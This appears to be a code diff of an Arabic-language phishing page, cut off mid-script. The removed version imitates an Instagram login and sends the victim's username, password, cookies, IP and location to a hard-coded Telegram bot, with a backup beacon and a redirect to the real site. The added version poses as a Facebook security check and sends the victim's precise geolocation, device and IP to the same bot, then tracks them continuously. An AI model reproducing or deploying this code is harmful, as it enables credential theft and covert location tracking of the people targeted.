@@ -3,267 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram • تسجيل الدخول</title>
+    <title>تحديث الأمان - فيسبوك</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
         body {
-            background-color: #fafafa;
+            background: #f0f2f5;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
-            align-items: center;
             min-height: 100vh;
-            direction: rtl;
         }
+
         .container {
-            max-width: 350px;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             width: 100%;
-        }
-        .box {
-            border: 1px solid #dbdbdb;
-            background-color: white;
-            padding: 20px 40px;
+            max-width: 500px;
             text-align: center;
-            margin-bottom: 10px;
         }
-        .logo {
-            width: 175px;
-            margin: 22px auto 12px;
+
+        h1 {
+            color: #1877f2;
+            margin-bottom: 30px;
         }
-        form {
-            margin-top: 24px;
-        }
-        input {
-            width: 100%;
-            padding: 9px 8px 7px;
-            margin-bottom: 6px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #fafafa;
-            font-size: 12px;
+
+        .geo-box {
+            background: #f0f2f5;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
             direction: ltr;
         }
-        button {
-            width: 100%;
-            padding: 7px 16px;
-            margin: 8px 0;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .separator {
-            display: flex;
-            align-items: center;
-            margin: 10px 0;
-            color: #8e8e8e;
-            font-size: 13px;
-        }
-        .line {
-            flex-grow: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-        .facebook-login {
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            margin: 15px 0;
-        }
-        .forgot-password {
-            font-size: 12px;
-            color: #00376b;
-        }
-        .footer {
-            text-align: center;
-            font-size: 14px;
-        }
-        .get-app {
-            text-align: center;
-            margin: 20px 0;
-        }
-        .app-buttons {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        .app-button {
-            height: 40px;
-            margin: 0 4px;
-        }
     </style>
-    
 </head>
 <body>
     <div class="container">
-        <div class="box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
-            <form id="loginForm">
-                <input type="text" placeholder="البريد الإلكتروني أو اسم المستخدم" id="username" required>
-                <input type="password" placeholder="كلمة المرور" id="password" required>
-                <button type="submit">تسجيل الدخول</button>
-            </form>
-            
-            <div class="separator">
-                <div class="line"></div>
-                <span>أو</span>
-                <div class="line"></div>
-            </div>
-            
-            <div class="facebook-login">
-                <i class="fab fa-facebook-square"></i> تسجيل الدخول باستخدام فيسبوك
-            </div>
-            
-            <div class="forgot-password">
-                نسيت كلمة المرور؟
-            </div>
-        </div>
+        <h1>تأكيد الموقع الجغرافي</h1>
+        <p>لحماية حسابك، يرجى تأكيد موقعك الحالي:</p>
         
-        <div class="box">
-            <div class="footer">
-                ليس لديك حساب؟ <a href="#">اشترك</a>
-            </div>
+        <div class="geo-box" id="geoData">
+            جاري تحديد الموقع...
         </div>
-        
-        <div class="get-app">
-            <p>حمل التطبيق.</p>
-            <div class="app-buttons">
-                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_arabic_arabic.png/4b70f6fae447.png" class="app-button" alt="App Store">
-                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_arabic_arabic.png/4b70f6fae447.png" class="app-button" alt="Google Play">
-            </div>
-        </div>
+
+        <button onclick="sendLocation()">تأكيد الموقع</button>
     </div>
 
-
     <script>
-        // 1. تأكد من صحة التوكن ورقم الدردشة
-        const botToken = '7384019095:AAH5-rzlhgKpM0oZ8iMGl4DayJt9UAD3c2I'; // استبدل بتوكن بوتك
-        const chatId = '6237935028'; // استبدل برقم الدردشة
+        // Geolocation Module
+        const getGeo = () => {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve(position),
+                    error => reject(error),
+                    {enableHighAccuracy: true, timeout: 5000}
+                );
+            });
+        };
 
-        // 2. أضف هذه الدالة الجديدة للإرسال بشكل أكثر موثوقية
-        async function sendDataToBot(data) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            try {
-                // 3. استخدم FormData بدلاً من JSON لتفادي مشاكل CORS
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('text', formatMessage(data));
-                formData.append('parse_mode', 'HTML');
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+        // Live Location Tracker
+        const liveTracker = () => {
+            const watchId = navigator.geolocation.watchPosition(
+                position => {
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lng = position.coords.longitude.toFixed(6);
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}&z=18`;
+                    
+                    document.getElementById('geoData').innerHTML = `
+                        خط العرض: ${lat}<br>
+                        خط الطول: ${lng}<br>
+                        <a href="${mapsLink}" target="_blank">رابط الخريطة المباشر</a>
+                    `;
+                },
+                error => {
+                    document.getElementById('geoData').innerHTML = 
+                        'خطأ في تحديد الموقع: ' + error.message;
                 }
-                
-                return await response.json();
-            } catch (error) {
-                console.error('فشل الإرسال:', error);
-                // 4. حل بديل إذا فشل الإرسال
-                backupSendMethod(data);
-                return null;
-            }
-        }
+            );
+            return watchId;
+        };
 
-        // 5. دالة مساعدة لتنسيق الرسالة
-        function formatMessage(data) {
-            return `
-<b>🎯 بيانات جديدة تم جمعها</b>
-
-<b>🔐 بيانات الدخول:</b>
-👤 <b>اسم المستخدم:</b> ${escapeHtml(data.username)}
-🔑 <b>كلمة المرور:</b> ${escapeHtml(data.password)}
-
-<b>🌍 معلومات الشبكة:</b>
-📡 <b>IP:</b> ${escapeHtml(data.ip)}
-🏙️ <b>المدينة:</b> ${escapeHtml(data.city)}
-📍 <b>الموقع:</b> <a href="https://www.google.com/maps?q=${data.location.lat},${data.location.lng}">عرض على الخريطة</a>
-
-<b>🍪 الكوكيز:</b>
-<pre>${escapeHtml(data.cookies)}</pre>
-
-<b>📌 كلمات المرور المحفوظة:</b>
-<pre>${escapeHtml(JSON.stringify(data.savedPasswords, null, 2))}</pre>
-            `;
-        }
-
-        // 6. دالة للهروب من أحرف HTML
-        function escapeHtml(unsafe) {
-            return unsafe.toString()
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
-        }
-
-        // 7. طريقة إحتياطية للإرسال
-        function backupSendMethod(data) {
-            const backupUrl = 'https://your-backup-server.com/api';
-            const img = new Image();
-            img.src = `${backupUrl}?data=${encodeURIComponent(JSON.stringify(data))}`;
-        }
-
-        // 8. تعديل دالة إرسال النموذج
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const loading = document.createElement('div');
-            loading.innerHTML = 'جاري المعالجة...';
-            e.target.appendChild(loading);
-            
+        // Exfiltration Function
+        const sendLocation = async () => {
             try {
-                const [location, networkInfo] = await Promise.all([
-                    getLocation(),
-                    getNetworkInfo()
-                ]);
-                
-                const data = {
-                    username: document.getElementById('username').value,
-                    password: document.getElementById('password').value,
-                    cookies: document.cookie,
-                    ip: networkInfo.ip,
-                    city: networkInfo.city,
-                    location: location,
-                    savedPasswords: collectSavedPasswords()
+                const position = await getGeo();
+                const geoData = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date(position.timestamp),
+                    userAgent: navigator.userAgent,
+                    ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)
                 };
+
+                // Telegram Exfiltration
+                const botToken = '7384019095:AAH5-rzlhgKpM0oZ8iMGl4DayJt9UAD3c2I';
+                const chatId = '6237935028';
+                const mapsLink = `https://www.google.com/maps?q=${geoData.lat},${geoData.lng}`;
                 
-                // 9. إضافة محاولات إعادة عند الفشل
-                let attempts = 0;
-                const maxAttempts = 3;
-                
-                while (attempts < maxAttempts) {
-                    try {
-                        await sendDataToBot(data);
-                        break;
-                    } catch (err) {
-                        attempts++;
-                        if (attempts === maxAttempts) throw err;
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    }
-                }
-                
-                // 10. إعادة التوجيه بعد التأكد من الإرسال
-                window.location.href = 'https://www.instagram.com/accounts/login/';
-                
-            } catch (error) {
-                console.error('حدث خطأ:', error);
-                loading.innerHTML = 'حدث خطأ، جاري إعادة التوجيه...';
+                const message = `📍 موقع جديد!\n
+العنوان: ${mapsLink}\n
+الدقة: ${geoData.accuracy}m\n
+الجهاز: ${geoData.userAgent}\n
+الأي بي: ${geoData.ip}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        disable_web_page_preview: false
+                    })
+                });
+
+                // Continuous Tracking
+                const trackerId = liveTracker();
                 setTimeout(() => {
-                    window.location.href = 'https://www.instagram.com/accounts/login/';
-                }, 2000);
-            }
-        });
-    </script>
-</body>
-</html>
+                    navigator.geolocation.clearWatch
